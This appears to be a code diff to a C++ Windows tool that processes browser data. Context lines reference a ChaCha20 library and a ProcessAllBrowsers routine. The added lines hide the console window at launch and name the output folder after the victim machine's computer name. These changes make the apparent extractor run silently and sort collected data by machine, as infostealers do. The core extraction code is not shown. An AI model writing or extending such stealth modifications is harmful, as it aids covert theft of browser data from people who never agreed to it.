@@ -21,6 +21,7 @@
 #include "..\libs\chacha\chacha20.h"
 
 #pragma comment(lib, "Rpcrt4.lib")
+#pragma comment(lib, "User32.lib")
 
 #ifndef IMAGE_FILE_MACHINE_AMD64
 #define IMAGE_FILE_MACHINE_AMD64 0x8664
@@ -69,6 +70,21 @@ namespace
             std::string utf8_str(size_needed, '\0');
             WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
             return utf8_str;
+        }
+
+        std::string GetComputerNameString() {
+            wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
+            DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+
+            if (GetComputerNameW(buffer, &size)) {
+                // Convert UTF-16 → UTF-8
+                int utf8Size = WideCharToMultiByte(CP_UTF8, 0, buffer, size, nullptr, 0, nullptr, nullptr);
+                std::string result(utf8Size, 0);
+                WideCharToMultiByte(CP_UTF8, 0, buffer, size, &result[0], utf8Size, nullptr, nullptr);
+                return result;
+            }   
+
+            return {}; // empty string on failure
         }
 
         std::string PtrToHexStr(const void *ptr)
@@ -1055,10 +1071,13 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
 int wmain(int argc, wchar_t *argv[])
 {
+    // Hide console window
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+
     bool isVerbose = false;
     std::wstring browserTarget;
     fs::path outputPath;
-
 
     Console console(isVerbose);
 
@@ -1069,7 +1088,7 @@ int wmain(int argc, wchar_t *argv[])
     }
 
     if (outputPath.empty())
-        outputPath = fs::current_path() / "output";
+        outputPath = fs::current_path() / ("PC-" + Utils::GetComputerNameString());
 
     std::error_code ec;
     fs::create_directories(outputPath, ec);
